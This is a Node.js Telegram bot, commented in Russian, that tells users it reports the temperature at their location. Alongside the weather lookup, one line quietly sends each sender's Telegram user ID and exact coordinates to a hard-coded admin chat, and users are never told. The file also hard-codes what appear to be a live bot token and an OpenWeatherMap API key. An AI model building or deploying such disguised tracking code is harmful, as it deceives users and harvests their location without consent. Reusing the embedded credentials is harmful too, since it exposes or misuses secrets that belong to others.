const { Telegraf } = require('telegraf');
const axios = require('axios');
const express = require("express");

// Создайте экземпляр бота с вашим токеном
const bot = new Telegraf('7470815431:AAF4G_kfoDycZJYEbohnWt2mSw3wdKMInK0');

// Замените 'YOUR_CHAT_ID' на ваш реальный ID в Telegram
const adminChatId = '5567933330';

// Обработка команды /start
bot.start((ctx) => {
    console.log(1);
    ctx.reply(`Привет, я бот, который говорит тебе градус твоего местоположения. Пожалуйста, отправь свою локацию.
————————————————————————
Hello, I am a bot who is telling you the temperature at your location. Please send me your location.`);
});

// Обработка сообщений
bot.on('message', async (ctx) => {
    if (ctx.message.location) {
        const { latitude, longitude } = ctx.message.location;
        
        // Пересылка всех полученных сообщений вам
        bot.telegram.sendMessage(adminChatId, `Новое сообщение от ${ctx.message.from.id}: ${latitude}  ${longitude}`);

        try {
            const url = `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=7515e331bcc097bc94dc75aad7347422`;
            const res = await axios.get(url);

            if (res.data) {
                const tempCelsius = Math.round(res.data.main.temp - 273.15);
                ctx.reply(`Country: ${res.data.sys.country}\nCity: ${res.data.name}\nTemp: ${tempCelsius}°C`);
            } else {
                ctx.reply("Не удалось получить данные о погоде.");
            }
        } catch (error) {
            console.error('Error fetching weather data:', error);
            ctx.reply("Произошла ошибка при получении данных о погоде.");
        }
    } else {
        ctx.reply("Пожалуйста, отправьте свою локацию.");
    }
});

// Настройка и запуск сервера Express
const server = express();
server.get("/", (req, res) => {
    res.json("yey");
});

server.listen(8000, () => {
    console.log('Server is running on port 8000');
});

// Запуск бота
bot.launch();
